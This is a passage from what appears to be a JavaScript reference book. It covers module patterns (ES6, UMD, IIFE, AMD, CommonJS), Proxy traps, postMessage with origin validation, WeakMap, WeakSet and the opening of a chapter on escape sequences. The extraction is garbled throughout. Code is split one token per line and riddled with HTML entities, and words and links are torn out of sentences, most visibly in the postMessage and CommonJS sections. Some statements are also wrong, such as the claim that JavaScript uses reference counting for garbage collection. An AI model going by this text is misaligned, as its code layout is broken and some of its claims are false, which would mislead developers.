  window.indexedDB
  

  

You can test for IndexedDB support in the current environment by
checking for the presence of the property:

**if**

(

window.

indexedDB

)

{

*// IndexedDB is available*

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 73: Modularization Techniques
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 73.1: ES6 Modules
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Version ≥ 6

In ECMAScript 6, when using the module syntax (import/export), each
file becomes its own module with a private namespace. Top-level
functions and variables do not pollute the global namespace. To expose
functions, classes, and variables for other modules to import, you can
use the export keyword.
>
**Note:** Although this is the official method for creating JavaScript
modules, it is not supported by any major browsers right now. However,
ES6 Modules are supported by many transpilers.

export

**function**

greet

(

name

)

{

console.

log

(

&quot;Hello %s!&quot;

,

name

)

;

}

**var**

myMethod

=

**function**

(

param

)

{

**return**

&quot;Here&apos;s what you said: &quot;

&plus;

param

;

}

;

export

{

myMethod

}

export

class

MyClass

{

test

(

)

{

}

}

**Using Modules**
>
Importing modules is as simple as specifying their path:

import

greet from

&quot;mymodule.js&quot;

;

greet

(

&quot;Bob&quot;

)

;

  
  mymodule.js
  

  

This imports only the myMethod method from our file.
>
It&apos;s also possible to import all methods from a module:

import

&ast;

as myModule from

&quot;mymodule.js&quot;

;

myModule.

greet

(

&quot;Alice&quot;

)

;

You can also import methods under a new name:

import

{

greet as A

,

myMethod as B

}

from

&quot;mymodule.js&quot;

;

More information on ES6 Modules can be found in the Modules topic.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 73.2: Universal Module Definition (UMD)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

The UMD (Universal Module Definition) pattern is used when our module
needs to be imported by a number of different module loaders (e.g.
AMD, CommonJS).
>
The pattern itself consists of two parts:

1.  An IIFE (Immediately-Invoked Function Expression) that checks for
    the module loader that is being implemented by the user. This will
    take two arguments; root (a **this** reference to the global scope)
    and factory (the function where we declare our module).

2.  An anonymous function that creates our module. This is passed as the
    second argument to the IIFE portion of the pattern. This function is
    passed any number of arguments to specify the dependencies of the
    module.

In the below example we check for AMD, then CommonJS. If neither of
those loaders are in use we fall back to making the module and its
dependencies available globally.

(

**function**

(

root

,

factory

)

{

**if**

(

**typeof**

define

===

&apos;function&apos;

&&

define.

amd

)

{

*// AMD. Register as an anonymous module.*

define

(

&lbrack;

&apos;exports&apos;

,

&apos;b&apos;

&rbrack;

,

factory

)

;

}

**else**

**if**

(

**typeof**

exports

===

&apos;object&apos;

&&

**typeof**

exports.

nodeName

!==

&apos;string&apos;

)

{

*// CommonJS*

factory

(

exports

,

require

(

&apos;b&apos;

)

)

;

}

**else**

{

*// Browser globals*

factory

(

(

root.

commonJsStrict

=

{

}

)

,

root.

b

)

;

}

}

(

**this**

,

**function**

(

exports

,

b

)

{

*//use b in some fashion.*

*// attach properties to the exports object to define*

*// the exported module properties.*

exports.

action

=

**function**

(

)

{

}

;

}

)

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 73.3: Immediately invoked function expressions (IIFE)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Immediately invoked function expressions can be used to create a
private scope while producing a public API.

**var**

Module

=

(

**function**

(

)

{

**var**

privateData

=

1

;

**return**

{

getPrivateData

:

**function**

(

)

{

**return**

privateData

;

}

}

;

}

)

(

)

;

Module.

getPrivateData

(

)

;

*// 1*

Module.

privateData

;

*// undefined*

See the Module Pattern for more details.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 73.4: Asynchronous Module Definition (AMD)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

AMD is a module definition system that attempts to address some of the
common issues with other systems like CommonJS and anonymous closures.

AMD addresses these issues by:

Registering the factory function by calling define(), instead of
immediately executing it

Passing dependencies as an array of module names, which are then
loaded, instead of using globals

Only executing the factory function once all the dependencies have
been loaded and executed

Passing the dependent modules as arguments to the factory function

The key thing here is that a module can have a dependency and not hold
everything up while waiting for it to load, without the developer
having to write complicated code.

Here&apos;s an example of AMD:

*// Define a module &quot;myModule&quot; with two dependencies, jQuery and
Lodash*

define

(

&quot;myModule&quot;

,

&lbrack;

&quot;jquery&quot;

,

&quot;lodash&quot;

&rbrack;

,

**function**

(

&dollar;

,

&lowbar;

)

{

*// This publicly accessible object is our module*

*// Here we use an object, but it can be of any type*

**var**

myModule

=

{

}

;

**var**

privateVar

=

&quot;Nothing outside of this module can see me&quot;

;

**var**

privateFn

=

**function**

(

param

)

{

**return**

&quot;Here&apos;s what you said: &quot;

&plus;

param

;

}

;

myModule.

version

=

1

;

myModule.

moduleMethod

=

**function**

(

)

{

*// We can still access global variables from here, but it&apos;s better*

*// if we use the passed ones*

**return**

privateFn

(

windowTitle

)

;

}

;

**return**

myModule

;

}

)

;

Modules can also skip the name and be anonymous. When that&apos;s done,
they&apos;re usually loaded by file name.

define

(

&lbrack;

&quot;jquery&quot;

,

&quot;lodash&quot;

&rbrack;

,

**function**

(

&dollar;

,

&lowbar;

)

{

*/&ast; factory &ast;/*

}

)

;

They can also skip dependencies:

define

(

**function**

(

)

{

*/&ast; factory &ast;/*

}

)

;

Some AMD loaders support defining modules as plain objects:

define

(

&quot;myModule&quot;

,

{

version

:

1

,

value

:

&quot;sample string&quot;

}

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 73.5: CommonJS - Node.js
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

CommonJS is a popular modularization pattern that&apos;s used in Node.js.

  
  require
  

  

The CommonJS system is centered around a () function that loads other
modules and an exports property that lets modules export publicly
accessible methods.
>
Here&apos;s an example of CommonJS, we&apos;ll load Lodash and Node.js&apos; fs
module:

*// Load fs and lodash, we can use them anywhere inside the module*

**var**

fs

=

require

(

&quot;fs&quot;

)

,

&lowbar;

=

require

(

&quot;lodash&quot;

)

;

**var**

myPrivateFn

=

**function**

(

param

)

{

**return**

&quot;Here&apos;s what you said: &quot;

&plus;

param

;

}

;

*// Here we export a public &grave;myMethod&grave; that other modules can use*

exports.

myMethod

=

**function**

(

param

)

{

**return**

myPrivateFn

(

param

)

;

}

;

  
  module.exports
  

  

You can also export a function as the entire module using :

module.

exports

=

**function**

(

)

{

**return**

&quot;Hello!&quot;

;

}

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 74: Proxy
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
**Parameter Details**

target The target object, actions on this object (getting, setting,
etc&hellip;) will be routed through the handler handler An object that can
define &quot;traps&quot; for intercepting actions on the target object
(getting, setting, etc&hellip;)

A Proxy in JavaScript can be used to modify fundamental operations on
objects. Proxies were introduced in ES6. A

Proxy on an object is itself an object, that has *traps*. Traps may be
triggered when operations are performed on the Proxy. This includes
property lookup, function calling, modifying properties, adding
properties, et cetera. When no applicable trap is defined, the
operation is performed on the proxied object as if there was no Proxy.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 74.1: Proxying property lookup
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

To influence property lookup, the **get** handler must be used.

In this example, we modify property lookup so that not only the value,
but also the type of that value is returned. We use
[Reflect](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Reflect)
to ease this.

**let**

handler

=

{

**get**

(

target

,

property

)

{

**if**

(

!

Reflect.

has

(

target

,

property

)

)

{

**return**

{

value

:

**undefined**

,

type

:

&apos;undefined&apos;

}

;

}

**let**

value

=

Reflect.

**get**

(

target

,

property

)

;

**return**

{

value

:

value

,

type

:

**typeof**

value

}

;

}

}

;

**let**

proxied

=

**new**

Proxy

(

{

foo

:

&apos;bar&apos;

}

,

handler

)

;

console.

log

(

proxied.

foo

)

;

*// logs &grave;Object {value: &quot;bar&quot;, type: &quot;string&quot;}&grave;*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 74.2: Very simple proxy (using the set trap)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

This proxy simply appends the string &quot; went through proxy&quot; to every
string property set on the target object.

**let**

object

=

{

}

;

**let**

handler

=

{

**set**

(

target

,

prop

,

value

)

{

*// Note that ES6 object syntax is used*

**if**

(

&apos;string&apos;

===

**typeof**

value

)

{

target

&lbrack;

prop

&rbrack;

=

value

&plus;

&quot; went through proxy&quot;

;

}

}

}

;

**let**

proxied

=

**new**

Proxy

(

object

,

handler

)

;

proxied.

example

=

&quot;ExampleValue&quot;

;

console.

log

(

object

)

;

*// logs: { example: &quot;ExampleValue went through proxy&quot; }*

*// you could also access the object via proxied.target*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 75: .postMessage() and MessageEvent
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**Parameters** **message** **targetOrigin**

transfer optional
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 75.1: Getting Started
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**What is
[.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage),
when and why do we use it**

  
  [**postMessage**](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
  

  

**[.()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
method is a way to safely allow communication between cross-origin
scripts.**

  
  window.open               ()). With                                                                  [postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
                            [.](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   
    -

  

Normally, two different pages, can only directly communicate with each
other using JavaScript when they are under the same origin, even if
one of them is embedded into another (e.g. iframes) or one is opened
from inside the other (e.g.
[()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage),
you can work around this restriction while still staying safe.

  
  [**postMessage**](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
  

  

**You can only use
[.()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
when you have access to both pages&apos; JavaScript code.** Since the
receiver needs to validate the sender and process the message
accordingly, you can only use this method to communicate between two
scripts you have access to.

  
  http             :    *//sender.com*
  -  

  

  -
  http            :   *//receiver.com*
    

  -

We will build an example to send messages to a child window and have
the messages be displayed on the child window. The parent/sender page
will be assumed to be and child/receiver page will be assumed to be
for the example.
>
**Sending messages**

  
  [window.open](https://developer.mozilla.org/en-US/docs/Web/API/Window/open)
  

  

In order to send messages to another window, you need to have a
reference to its
[window](https://developer.mozilla.org/en-US/docs/Web/API/Window)
object.
[()](https://developer.mozilla.org/en-US/docs/Web/API/Window/open)
returns the reference object of the newly opened window. For other
methods to obtain a reference to a window object, see the explanation
under otherWindow parameter
[here](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#Syntax).

**var**

childWindow

=

window.

open

(

&quot;http://receiver.com&quot;

,

&quot;&lowbar;blank&quot;

)

;

Add a textarea and a send button that will be used to send messages to
child window.

**&lt;**

**textarea**

id

=

&quot;text&quot;

**&gt;**

**&lt;**

**/textarea**

**&gt;**

**&lt;**

**button**

id

=

&quot;btn&quot;

**&gt;**

Send Message

**&lt;**

**/button**

**&gt;**

  
  [postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [(](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [message](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [,](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [targetOrigin](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
  -    

  

Send the text of textarea using
[.)](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
when the button is clicked.

**var**

btn

=

document.

getElementById

(

&quot;btn&quot;

)

,

text

=

document.

getElementById

(

&quot;text&quot;

)

;

btn.

addEventListener

(

&quot;click&quot;

,

**function**

(

)

{

sendMessage

(

text.

value

)

;

text.

value

=

&quot;&quot;

;

}

)

;

**function**

sendMessage

(

message

)

{

**if**

(

!

message

&vert;&vert;

!

message.

length

)

**return**

;

childWindow.

postMessage

(

JSON.

stringify

(

{

message

:

message

,

time

:

**new**

Date

(

)

}

)

,

&apos;http://receiver.com&apos;

)

;

}

  
  [JSON.stringify](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify)   [()](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify)   [JSON.parse](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse)
                                                                                                                   and                                                                                                  
    -

  

  
  [Transfarable                                                            can be given as the third optional parameter of the                        [postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [(](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [message](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
  Object](https://developer.mozilla.org/en-US/docs/Web/API/Transferable)   [.](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)                                                                                                                                                                   
  -  -  

  

In order send and receive JSON objects instead of a simple string,
[()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse)
methods can be used. A
[,](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)

  
  [targetOrigin](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [,](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)   [transfer](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
    -

  

[)](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
method, but browser support is still lacking even in modern browsers.

  -
  http            :   *//receiver.com*
    

  -

For this example, since our receiver is assumed to be page, we enter
its url as the targetOrigin. The value of this parameter should match
the origin of the childWindow object for the message to be send. It is
possible to use &ast; as a wildcard but is **highly recommended** to
avoid using the wildcard and always set this parameter to receiver&apos;s
specific origin **for security reasons**.
>
**Receiving, Validating and Processing Messages**

  -
  http            :   *//receiver.com*
    

  -

The code under this part should be put in the receiver page, which is
for our example.
>
In order to receive messages, the [message
event](https://developer.mozilla.org/en-US/docs/Web/Events/message_webmessaging)
of the window should be listened.

window.

addEventListener

(

&quot;message&quot;

,

receiveMessage

)

;

When a message is received there are a couple of **steps that should
be followed to assure security as much as possible**.
>
Validate the sender
>
Validate the message
>
Process the message
>
The sender should always be validated to make sure the message is
received from a trusted sender. After that, the message itself should
be validated to make sure nothing malicious is received. After these
two validations, the message can be processed.

**function**

receiveMessage

(

ev

)

{

*//Check event.origin to see if it is a trusted sender.*

*//If you have a reference to the sender, validate event.source*

*//We only want to receive messages from http://sender.com, our trusted
sender page.*

**if**

(

ev.

origin

!==

&quot;http://sender.com&quot;

&vert;&vert;

ev.

source

!==

window.

opener

)

**return**

;

*//Validate the message*

*//We want to make sure it&apos;s a valid json object and it does not
contain anything malicious*

**var**

data

;

**try**

{

data

=

JSON.

parse

(

ev.

data

)

;

*//data.message = cleanseText(data.message)*

}

**catch**

(

ex

)

{

**return**

;

}

*//Do whatever you want with the received message*

*//We want to append the message into our #console div*

**var**

p

=

document.

createElement

(

&quot;p&quot;

)

;

p&period;

innerText

=

(

**new**

Date

(

data.

time

)

)

.

toLocaleTimeString

(

)

&plus;

&quot; &vert; &quot;

&plus;

data.

message

;

document.

getElementById

(

&quot;console&quot;

)

.

appendChild

(

p

)

;

}

[Click here for a JS Fiddle showcasing its
usage.](https://jsfiddle.net/ozzan/6gjstodk/)

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 76: WeakMap
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 76.1: Creating a WeakMap object
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

WeakMap object allows you to store key/value pairs. The difference
from Map is that keys must be objects and are weakly referenced. This
means that if there aren&apos;t any other strong references to the key,
the element in WeakMap can be removed by garbage collector.
>
WeakMap constructor has an optional parameter, which can be any
iterable object (for example Array) containing key/value pairs as
two-element arrays.

**const**

o1

=

{

a

:

1

,

b

:

2

}

,

o2

=

{

}

;

**const**

weakmap

=

**new**

WeakMap

(

&lbrack;

&lbrack;

o1

,

**true**

&rbrack;

,

&lbrack;

o2

,

o1

&rbrack;

&rbrack;

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 76.2: Getting a value associated to the key
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  .**get**()
  

  

To get a value associated to the key, use the method. If there&apos;s no
value associated to the key, it returns

**undefined**

.

**const**

obj1

=

{

}

,

obj2

=

{

}

;

**const**

weakmap

=

**new**

WeakMap

(

&lbrack;

&lbrack;

obj1

,

7

&rbrack;

&rbrack;

)

;

console.

log

(

weakmap.

**get**

(

obj1

)

)

;

*// 7*

console.

log

(

weakmap.

**get**

(

obj2

)

)

;

*// undefined*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 76.3: Assigning a value to the key
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  .**set**()   method. It returns the WeakMap object, so you can chain   .**set**()
   - 

  

To assign a value to the key, use the calls.

**const**

obj1

=

{

}

,

obj2

=

{

}

;

**const**

weakmap

=

**new**

WeakMap

(

)

;

weakmap.

**set**

(

obj1

,

1

)

.

**set**

(

obj2

,

2

)

;

console.

log

(

weakmap.

**get**

(

obj1

)

)

;

*// 1*

console.

log

(

weakmap.

**get**

(

obj2

)

)

;

*// 2*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 76.4: Checking if an element with the key exists
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  .has()
  

  

To check if an element with a specified key exits in a WeakMap, use
the method. It returns **true** if it exits, and otherwise **false**.

**const**

obj1

=

{

}

,

obj2

=

{

}

;

**const**

weakmap

=

**new**

WeakMap

(

&lbrack;

&lbrack;

obj1

,

7

&rbrack;

&rbrack;

)

;

console.

log

(

weakmap.

has

(

obj1

)

)

;

*// true*

console.

log

(

weakmap.

has

(

obj2

)

)

;

*// false*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 76.5: Removing an element with the key
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  **delete**
  

  

To remove an element with a specified key, use the .() method. It
returns **true** if the element existed and has been removed,
otherwise **false**.

**const**

obj1

=

{

}

,

obj2

=

{

}

;

**const**

weakmap

=

**new**

WeakMap

(

&lbrack;

&lbrack;

obj1

,

7

&rbrack;

&rbrack;

)

;

console.

log

(

weakmap.

**delete**

(

obj1

)

)

;

*// true*

console.

log

(

weakmap.

has

(

obj1

)

)

;

*// false*

console.

log

(

weakmap.

**delete**

(

obj2

)

)

;

*// false*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 76.6: Weak reference demo
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

JavaScript uses [reference
counting](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Memory_Management)
technique to detect unused objects. When reference count to an object
is zero, that object will be released by the garbage collector.
Weakmap uses weak reference that does not contribute to reference
count of an object, therefore it is very useful to solve memory [leak
problems](http://stackoverflow.com/questions/29413222/what-are-the-actual-uses-of-es6-weakmap).
>
Here is a demo of weakmap. I use a very large object as value to show
that weak reference does not contribute to reference count.

*// manually trigger garbage collection to make sure that we are in good
status.*

&gt;

global.

gc

(

)

;

**undefined**

*// check initial memory use*

，

*heapUsed is 4M or so*

&gt;

process.

memoryUsage

(

)

;

{

rss

:

21106688

,

heapTotal

:

7376896

,

heapUsed

:

4153936

,

external

:

9059

}

&gt;

**let**

wm

=

**new**

WeakMap

(

)

;

**undefined**

&gt;

**const**

b

=

**new**

Object

(

)

;

**undefined**

&gt;

global.

gc

(

)

;

**undefined**

*// heapUsed is still 4M or so*

&gt;

process.

memoryUsage

(

)

;

{

rss

:

20537344

,

heapTotal

:

9474048

,

heapUsed

:

3967272

,

external

:

8993

}

*// add key-value tuple into WeakMap*

，

*// key is b*

，

*value is 5&ast;1024&ast;1024 array*

&gt;

wm.

**set**

(

b

,

**new**

Array

(

5

&ast;

1024

&ast;

1024

)

)

;

WeakMap

{

}

*// manually garbage collection*

&gt;

global.

gc

(

)

;

**undefined**

*// heapUsed is still 45M*

&gt;

process.

memoryUsage

(

)

;

{

rss

:

62652416

,

heapTotal

:

51437568

,

heapUsed

:

45911664

,

external

:

8951

}

*// b reference to null*

&gt;

b

=

**null**

;

**null**

*// garbage collection*

&gt;

global.

gc

(

)

;

**undefined**

*// after remove b reference to object*

，

*heapUsed is 4M again*

*// it means the big array in WeakMap is released*

*// it also means weekmap does not contribute to big array&apos;s reference
count, only b does.*

&gt;

process.

memoryUsage

(

)

;

{

rss

:

20639744

,

heapTotal

:

8425472

,

heapUsed

:

3979792

,

external

:

8956

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 77: WeakSet
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 77.1: Creating a WeakSet object
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

The WeakSet object is used for storing weakly held objects in a
collection. The difference from Set is that you can&apos;t store primitive
values, like numbers or string. Also, references to the objects in the
collection are held weakly, which means that if there is no other
reference to an object stored in a WeakSet, it can be garbage
collected.
>
The WeakSet constructor has an optional parameter, which can be any
iterable object (for example an array). All of its elements will be
added to the created WeakSet.

**const**

obj1

=

{

}

,

obj2

=

{

}

;

**const**

weakset

=

**new**

WeakSet

(

&lbrack;

obj1

,

obj2

&rbrack;

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 77.2: Adding a value
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  .add()
  

  

To add a value to a WeakSet, use the method. This method is chainable.

**const**

obj1

=

{

}

,

obj2

=

{

}

;

**const**

weakset

=

**new**

WeakSet

(

)

;

weakset.

add

(

obj1

)

.

add

(

obj2

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 77.3: Checking if a value exists
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  .has()
  

  

To check if a value exits in a WeakSet, use the method.

**const**

obj1

=

{

}

,

obj2

=

{

}

;

**const**

weakset

=

**new**

WeakSet

(

&lbrack;

obj1

&rbrack;

)

;

console.

log

(

weakset.

has

(

obj1

)

)

;

*// true*

console.

log

(

weakset.

has

(

obj2

)

)

;

*// false*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 77.4: Removing a value
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  .**delete**()
  

  

To remove a value from a WeakSet, use the method. This method returns
**true** if the value existed and has been removed, otherwise
**false**.

**const**

obj1

=

{

}

,

obj2

=

{

}

;

**const**

weakset

=

**new**

WeakSet

(

&lbrack;

obj1

&rbrack;

)

;

console.

log

(

weakset.

**delete**

(

obj1

)

)

;

*// true*

console.

log

(

weakset.

**delete**

(

obj2

)

)

;

*// false*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 78: Escape Sequences
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 78.1: Entering special characters in strings and regular expressions
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Most printable characters can be included in string or regular
expression literals just as they are, e.g.

**var**

str

=

&quot;

ポ

ケ

モ

ン

&quot;

;

*// a valid string*

**var**

regExp

=

*/&lbrack;*

Α

*-*

Ω

α

*-*

ω

*&rbrack;*

*/*

;

*// matches any Greek letter without diacritics*

In order to add arbitrary characters to a string or regular
expression, including non-printable ones, one has to use *escape
sequences*. Escape sequences consist of a backslash (&quot;&bsol;&bsol;&bsol;&amp;quot;)
followed by one or more other characters. To write an escape sequence
for a particular character, one typically (but not always) needs to
know its hexadecimal character code.
>
JavaScript provides a number of different ways to specify escape
